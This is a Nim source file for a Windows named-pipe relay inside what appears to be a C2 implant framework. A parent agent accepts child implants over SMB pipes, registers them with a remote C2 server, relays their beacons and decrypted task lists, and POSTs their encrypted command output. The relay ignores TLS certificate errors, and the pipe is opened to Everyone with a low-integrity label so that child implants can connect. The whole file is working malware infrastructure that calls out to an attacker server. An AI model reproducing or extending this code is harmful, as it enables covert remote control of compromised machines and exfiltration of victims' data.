## pipe_server.nim — SMB named-pipe relay server for the HTTP Nim agent.
## Windows only. Called from commands.nim when PIPE_START task arrives.
## Protocol is identical to pipe_server.c / pipe_server_windows.go:
##   Child → REGISTER → parent forwards to C2 /register → relay response
##   Child → BEACON   → parent relays to C2, decrypts tasks, sends task array
##   Child → RESULT   → parent encrypts, POSTs to C2 /result/<id>

when defined(windows):
  import winim/lean, winim/inc/winhttp
  import std/[json, base64, strutils]
  import config, crypto

  # ── Named pipe constants (may not be exported by winim/lean) ────────────────
  const
    PS_PIPE_ACCESS_DUPLEX      = DWORD(0x00000003)
    PS_PIPE_TYPE_BYTE          = DWORD(0x00000000)  # also PIPE_WAIT = 0
    PS_PIPE_UNLIMITED_INSTANCES = DWORD(0x000000FF)
    PS_ERROR_PIPE_CONNECTED    = DWORD(535)

  # ── Extra Win32 API (not always in winim/lean) ──────────────────────────────

  proc CancelIoEx(hFile: HANDLE, lpOverlapped: pointer): WINBOOL
    {.stdcall, dynlib: "kernel32", importc.}

  proc ConvertStringSecurityDescriptorToSecurityDescriptorW(
    StringSecurityDescriptor: LPCWSTR,
    StringSDRevision: DWORD,
    SecurityDescriptor: ptr PSECURITY_DESCRIPTOR,
    SecurityDescriptorSize: ptr ULONG): WINBOOL
    {.stdcall, dynlib: "advapi32", importc.}

  proc LocalFreePs(hMem: HLOCAL): HLOCAL
    {.stdcall, dynlib: "kernel32", importc: "LocalFree".}

  # MultiByteToWideChar — convert UTF-8 pipe name in main thread so the accept
  # thread never calls newWideCString (Nim GC allocation from a foreign Win32
  # thread corrupts GC globals, same root cause as noSleepMask).
  proc MultiByteToWideCharPs(CodePage: uint32, dwFlags: uint32,
      lpMultiByteStr: cstring, cbMultiByte: int32,
      lpWideCharStr: ptr uint16, cchWideChar: int32): int32
    {.stdcall, dynlib: "kernel32", importc: "MultiByteToWideChar".}

  # ── 4-byte LE framing ────────────────────────────────────────────────────────

  proc psReadMsg(h: HANDLE): seq[byte] =
    var hdr: array[4, byte]
    var got: DWORD
    if ReadFile(h, addr hdr[0], 4, addr got, nil) == 0 or got < 4: return @[]
    let n = uint32(hdr[0]) or (uint32(hdr[1]) shl 8) or
            (uint32(hdr[2]) shl 16) or (uint32(hdr[3]) shl 24)
    if n == 0 or n > 16_000_000'u32: return @[]
    result = newSeq[byte](int(n))
    var off = 0
    while off < int(n):
      var r2: DWORD
      if ReadFile(h, addr result[off], DWORD(int(n) - off), addr r2, nil) == 0 or r2 == 0:
        return @[]
      inc off, int(r2)

  proc psWriteMsg(h: HANDLE; data: seq[byte]) =
    let n = uint32(data.len)
    var hdr: array[4, byte] = [byte(n and 0xff), byte((n shr 8) and 0xff),
                                byte((n shr 16) and 0xff), byte((n shr 24) and 0xff)]
    var w: DWORD
    discard WriteFile(h, addr hdr[0], 4, addr w, nil)
    if data.len > 0:
      discard WriteFile(h, unsafeAddr data[0], DWORD(data.len), addr w, nil)

  # ── WinHTTP relay to C2 ──────────────────────────────────────────────────────

  proc psParseUrl(): (string, INTERNET_PORT, bool) =
    var url = ServerUrl
    var isHttps = false
    var dport = INTERNET_PORT(80)
    if url.startsWith("https://"):
      url = url[8..^1]; isHttps = true; dport = INTERNET_PORT(443)
    elif url.startsWith("http://"):
      url = url[7..^1]
    let si = url.find('/')
    if si >= 0: url = url[0..<si]
    let ci = url.rfind(':')
    if ci >= 0:
      let p = try: parseInt(url[ci+1..^1]) except: int(dport)
      return (url[0..<ci], INTERNET_PORT(p), isHttps)
    return (url, dport, isHttps)

  # psToWide — convert a Nim string to a stack-allocated UTF-16 array without
  # touching the GC.  Called only from foreign Win32 threads (psConnThread etc.)
  # where Nim GC allocations (newWideCString, newSeq) would corrupt GC globals.
  proc psToWide[N: static int](s: string; buf: var array[N, uint16]) =
    discard MultiByteToWideCharPs(65001'u32, 0'u32, s.cstring, -1'i32,
      cast[ptr uint16](addr buf[0]), int32(N))

  # Precomputed C2 connection parameters derived from compile-time ServerUrl.
  # These are filled once by psGlobalInit (main thread, GC-safe) so that
  # psConnThread never needs to call psParseUrl (which returns Nim strings).
  var gC2Host: array[256, uint16]
  var gC2Port: INTERNET_PORT
  var gC2Https: bool
  var gC2UserAgent: array[512, uint16]

  proc psC2Init() =
    let (host, port, isHttps) = psParseUrl()
    psToWide(host, gC2Host)
    psToWide(UserAgent, gC2UserAgent)
    gC2Port  = port
    gC2Https = isHttps

  # GC-free HTTP relay to C2.  All wide-string conversions use stack arrays or
  # pre-computed globals — safe to call from foreign Win32 threads.
  proc psC2Do(meth, path: string; body: seq[byte] = @[]): (int, seq[byte]) =
    var wMeth: array[32,  uint16]
    var wPath: array[512, uint16]
    psToWide(meth, wMeth)
    psToWide(path, wPath)
    let hSess = WinHttpOpen(cast[LPCWSTR](addr gC2UserAgent[0]),
      WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0)
    if hSess == nil: return (0, @[])
    defer: discard WinHttpCloseHandle(hSess)
    let hConn = WinHttpConnect(hSess, cast[LPCWSTR](addr gC2Host[0]), gC2Port, 0)
    if hConn == nil: return (0, @[])
    defer: discard WinHttpCloseHandle(hConn)
    let flags = if gC2Https: DWORD(WINHTTP_FLAG_SECURE) else: DWORD(0)
    let hReq = WinHttpOpenRequest(hConn, cast[LPCWSTR](addr wMeth[0]),
      cast[LPCWSTR](addr wPath[0]), nil, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags)
    if hReq == nil: return (0, @[])
    defer: discard WinHttpCloseHandle(hReq)
    var secFlags = DWORD(SECURITY_FLAG_IGNORE_UNKNOWN_CA or
      SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE or SECURITY_FLAG_IGNORE_CERT_CN_INVALID or
      SECURITY_FLAG_IGNORE_CERT_DATE_INVALID)
    discard WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, addr secFlags, DWORD(sizeof(secFlags)))
    let bPtr: LPVOID = if body.len > 0: cast[LPVOID](unsafeAddr body[0]) else: nil
    if WinHttpSendRequest(hReq, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        bPtr, DWORD(body.len), DWORD(body.len), 0) == 0: return (0, @[])
    if WinHttpReceiveResponse(hReq, nil) == 0: return (0, @[])
    var code: DWORD; var codeSize = DWORD(sizeof(code))
    discard WinHttpQueryHeaders(hReq,
      WINHTTP_QUERY_STATUS_CODE or WINHTTP_QUERY_FLAG_NUMBER,
      WINHTTP_HEADER_NAME_BY_INDEX, addr code, addr codeSize, WINHTTP_NO_HEADER_INDEX)
    # Use a fixed stack buffer for reading the response — no GC allocation.
    var resp: seq[byte]
    var buf: array[8192, byte]
    var got: DWORD
    while true:
      if WinHttpReadData(hReq, cast[LPVOID](addr buf[0]), DWORD(sizeof(buf)), addr got) == 0: break
      if got == 0: break
      resp.add(buf[0..<int(got)])
    return (int(code), resp)

  # ── Per-connection state (heap-alloc, freed by psConnThread) ────────────────

  type PsConn = object
    pipe:     HANDLE
    agentId:  array[64, byte]   # null-terminated UTF-8
    aesKey:   array[32, byte]
    parentId: array[64, byte]   # copy of parent's agent ID

  # ── Relay helpers ────────────────────────────────────────────────────────────

  proc psRelayBeacon(h: HANDLE; cs: ptr PsConn) =
    let agentId = $cast[cstring](addr cs.agentId[0])
    let (code, resp) = psC2Do("GET", "/beacon/" & agentId)
    if code != 200 or resp.len == 0:
      psWriteMsg(h, cast[seq[byte]]("null")); return
    let key = @(cs.aesKey)
    let plain = openGCM(key, resp)
    if plain.len == 0:
      psWriteMsg(h, cast[seq[byte]]("null")); return
    try:
      let j = parseJson(cast[string](plain))
      let tasks = j{"tasks"}
      if tasks != nil and tasks.kind == JArray:
        psWriteMsg(h, cast[seq[byte]]($tasks))
      else:
        psWriteMsg(h, cast[seq[byte]]("null"))
    except:
      psWriteMsg(h, cast[seq[byte]]("null"))

  proc psRelayResult(msg: string; cs: ptr PsConn) =
    var taskId = 0'i64; var output = ""; var errStr = ""; var isAdmin = false
    try:
      let j = parseJson(msg)
      taskId  = j{"task_id"}.getBiggestInt(0)
      output  = j{"output"}.getStr("")
      errStr  = j{"error"}.getStr("")
      isAdmin = j{"is_admin"}.getBool(false)
    except: discard
    let agentId = $cast[cstring](addr cs.agentId[0])
    let plain = cast[seq[byte]]($(%*{
      "task_id": taskId, "output": output, "error": errStr, "is_admin": isAdmin}))
    let key = @(cs.aesKey)
    let enc = sealGCM(key, plain)
    discard psC2Do("POST", "/result/" & agentId, enc)

  # ── Per-connection thread ────────────────────────────────────────────────────

  proc psConnThread(p: LPVOID): DWORD {.stdcall.} =
    if p == nil: return 1
    let cs = cast[ptr PsConn](p)
    let h  = cs.pipe
    defer:
      discard DisconnectNamedPipe(h)
      discard CloseHandle(h)
      dealloc(cs)

    # Outer try/except: swallow any unhandled exception so the parent agent process
    # is never crashed by malformed data sent by a misbehaving child.
    try:
      let regBytes = psReadMsg(h)
      if regBytes.len == 0: return 1
      let regStr = cast[string](regBytes)

      var msgType = ""
      try: msgType = parseJson(regStr)["type"].getStr("") except: discard
      if msgType != "REGISTER": return 1

      var hostname, username, osStr, lang, procName: string
      var pid = 0'i64; var isAdmin = false
      var sleepSec = SleepSec; var jitter = JitterPct
      try:
        let j = parseJson(regStr)
        hostname = j{"hostname"}.getStr("")
        username = j{"username"}.getStr("")
        osStr    = j{"os"}.getStr("windows/amd64")
        pid      = j{"pid"}.getBiggestInt(0)
        isAdmin  = j{"is_admin"}.getBool(false)
        lang     = j{"language"}.getStr("nim")
        sleepSec = j{"sleep_sec"}.getInt(SleepSec)
        jitter   = j{"jitter_pct"}.getInt(JitterPct)
        procName = j{"process_name"}.getStr("")
      except: discard

      let parentId = $cast[cstring](addr cs.parentId[0])
      let regJson = $(%*{
        "hostname":     hostname,
        "username":     username,
        "os":           osStr,
        "pid":          pid,
        "transport":    "smb",
        "is_admin":     isAdmin,
        "language":     lang,
        "sleep_sec":    sleepSec,
        "jitter_pct":   jitter,
        "process_name": procName,
        "parent_id":    parentId
      })
      let (code, resp) = psC2Do("POST", "/register", cast[seq[byte]](regJson))
      if code != 200 or resp.len == 0: return 1

      try:
        let j    = parseJson(cast[string](resp))
        let aid  = j["agent_id"].getStr()
        let kb64 = j["aes_key"].getStr()
        let key  = cast[seq[byte]](base64.decode(kb64))
        if aid.len == 0 or key.len < 32: return 1
        copyMem(addr cs.agentId[0], unsafeAddr aid[0], min(aid.len, 63))
        copyMem(addr cs.aesKey[0],  unsafeAddr key[0], 32)
      except: return 1

      psWriteMsg(h, resp)

      while true:
        let msgBytes = psReadMsg(h)
        if msgBytes.len == 0: break
        let msg = cast[string](msgBytes)
        var mtype = ""
        try: mtype = parseJson(msg)["type"].getStr("") except: discard
        if   mtype == "BEACON": psRelayBeacon(h, cs)
        elif mtype == "RESULT": psRelayResult(msg, cs)
    except: discard
    return 0

  # ── Pipe security: World DACL + Low-integrity SACL via SDDL ─────────────────
  # S:(ML;;NW;;;LW) allows Low-integrity (schtask batch logon) children to connect.
  # D:(A;;0x1f019f;;;WD) grants Everyone (WD) full read+write+create_instance.
  # NOTE: lpSecurityDescriptor=nil is the default DACL (creator-only), NOT NULL DACL.

  var gPipeSD: PSECURITY_DESCRIPTOR = nil  # filled by psMakeSA

  proc psMakeSA(): SECURITY_ATTRIBUTES =
    let sddl: WideCString = newWideCString("S:(ML;;NW;;;LW)D:(A;;0x1f019f;;;WD)")
    discard ConvertStringSecurityDescriptorToSecurityDescriptorW(
      cast[LPCWSTR](sddl), 1, addr gPipeSD, nil)
    result = SECURITY_ATTRIBUTES(
      nLength:              DWORD(sizeof(SECURITY_ATTRIBUTES)),
      lpSecurityDescriptor: gPipeSD,
      bInheritHandle:       0)

  var gPipeSA = psMakeSA()

  # ── Per-server state ─────────────────────────────────────────────────────────

  const PS_MAX_SRVS = 8

  type PsSrvEntry = object
    name:     array[256, byte]
    wname:    array[256, uint16] # pre-computed UTF-16 in main thread (no GC in worker)
    stop:     int32              # guarded by gPsMu
    acceptH:  HANDLE             # guarded by gPsMu
    thread:   HANDLE
    parentId: array[64, byte]

  var gPsSrvs:  array[PS_MAX_SRVS, ptr PsSrvEntry]
  var gPsCount: int = 0
  var gPsMu:    CRITICAL_SECTION
  var gPsInited {.volatile.}: bool = false

  proc psGlobalInit() =
    if not gPsInited:
      InitializeCriticalSection(addr gPsMu)
      psC2Init()  # precompute C2 connection params in main thread (GC-safe)
      gPsInited = true

  # ── Accept thread ────────────────────────────────────────────────────────────

  proc psAcceptThread(p: LPVOID): DWORD {.stdcall.} =
    if p == nil: return 1
    let srv   = cast[ptr PsSrvEntry](p)
    # Use pre-computed UTF-16 name — avoids Nim GC allocation in a foreign Win32
    # thread which would corrupt GC globals (same issue as noSleepMask).
    let wname = cast[LPCWSTR](addr srv.wname[0])

    while true:
      EnterCriticalSection(addr gPsMu)
      let doStop = srv.stop != 0
      LeaveCriticalSection(addr gPsMu)
      if doStop: break

      let h = CreateNamedPipeW(wname,
          PS_PIPE_ACCESS_DUPLEX,
          PS_PIPE_TYPE_BYTE,
          PS_PIPE_UNLIMITED_INSTANCES,
          65536, 65536, 0, addr gPipeSA)
      if h == INVALID_HANDLE_VALUE:
        Sleep(500); continue

      EnterCriticalSection(addr gPsMu)
      srv.acceptH = h
      LeaveCriticalSection(addr gPsMu)

      let connected = ConnectNamedPipe(h, nil)
      let err = GetLastError()

      EnterCriticalSection(addr gPsMu)
      srv.acceptH = 0
      let stopNow = srv.stop != 0
      LeaveCriticalSection(addr gPsMu)

      if stopNow:
        discard CloseHandle(h); break

      if connected == 0 and err != PS_ERROR_PIPE_CONNECTED:
        discard CloseHandle(h); continue

      let cs = cast[ptr PsConn](alloc0(sizeof(PsConn)))
      cs.pipe = h
      copyMem(addr cs.parentId[0], addr srv.parentId[0], 64)
      var tid: DWORD = 0
      let t = CreateThread(nil, 0, psConnThread, cast[LPVOID](cs), 0, addr tid)
      if t != 0:
        discard CloseHandle(t)
      else:
        discard DisconnectNamedPipe(h)
        discard CloseHandle(h)
        dealloc(cs)

    return 0

  # ── Public API ────────────────────────────────────────────────────────────────

  proc normPipeName(s: string): string =
    if s.startsWith(r"\\.\pipe\") or s.startsWith("\\\\"): s
    else: r"\\.\pipe\" & s

  proc pipeServerStart*(name, parentId: string): string =
    psGlobalInit()
    let full = normPipeName(name)
    EnterCriticalSection(addr gPsMu)
    for i in 0..<gPsCount:
      if $cast[cstring](addr gPsSrvs[i].name[0]) == full:
        LeaveCriticalSection(addr gPsMu)
        return "[*] pipe server already running on " & full
    if gPsCount >= PS_MAX_SRVS:
      LeaveCriticalSection(addr gPsMu)
      return "[-] too many pipe servers"
    let srv = cast[ptr PsSrvEntry](alloc0(sizeof(PsSrvEntry)))
    copyMem(addr srv.name[0], unsafeAddr full[0], min(full.len, 255))
    # Pre-convert pipe name to UTF-16 here (main thread, GC safe) so the accept
    # thread never needs to call newWideCString from a foreign Win32 context.
    discard MultiByteToWideCharPs(65001'u32, 0'u32,
      cast[cstring](addr srv.name[0]), -1'i32,
      cast[ptr uint16](addr srv.wname[0]), 256'i32)
    if parentId.len > 0:
      copyMem(addr srv.parentId[0], unsafeAddr parentId[0], min(parentId.len, 63))
    var tid: DWORD = 0
    srv.thread = CreateThread(nil, 0, psAcceptThread, cast[LPVOID](srv), 0, addr tid)
    if srv.thread == 0:
      dealloc(srv)
      LeaveCriticalSection(addr gPsMu)
      return "[-] CreateThread failed for pipe server"
    gPsSrvs[gPsCount] = srv
    inc gPsCount
    LeaveCriticalSection(addr gPsMu)
    return "[+] pipe server started on " & full

  proc pipeServerStop*(name: string): string =
    psGlobalInit()
    EnterCriticalSection(addr gPsMu)
    if name.len == 0:
      let n = gPsCount
      if n == 0:
        LeaveCriticalSection(addr gPsMu)
        return "[*] no pipe servers running"
      var srvsCopy: array[PS_MAX_SRVS, ptr PsSrvEntry]
      for i in 0..<n: srvsCopy[i] = gPsSrvs[i]; gPsSrvs[i].stop = 1
      for i in 0..<n:
        let h = gPsSrvs[i].acceptH
        if h != 0: discard CancelIoEx(h, nil)
      gPsCount = 0
      LeaveCriticalSection(addr gPsMu)
      for i in 0..<n:
        let srv = srvsCopy[i]
        discard WaitForSingleObject(srv.thread, 3000)
        discard CloseHandle(srv.thread)
        dealloc(srv)
      return "[+] stopped " & $n & " pipe server(s)"

    let full = normPipeName(name)
    for i in 0..<gPsCount:
      if $cast[cstring](addr gPsSrvs[i].name[0]) != full: continue
      let srv = gPsSrvs[i]
      srv.stop = 1
      let h = srv.acceptH
      dec gPsCount
      if i < gPsCount: gPsSrvs[i] = gPsSrvs[gPsCount]
      gPsSrvs[gPsCount] = nil
      LeaveCriticalSection(addr gPsMu)
      if h != 0: discard CancelIoEx(h, nil)
      discard WaitForSingleObject(srv.thread, 3000)
      discard CloseHandle(srv.thread)
      dealloc(srv)
      return "[+] pipe server on " & full & " stopped"
    LeaveCriticalSection(addr gPsMu)
    return "[-] no pipe server on " & full
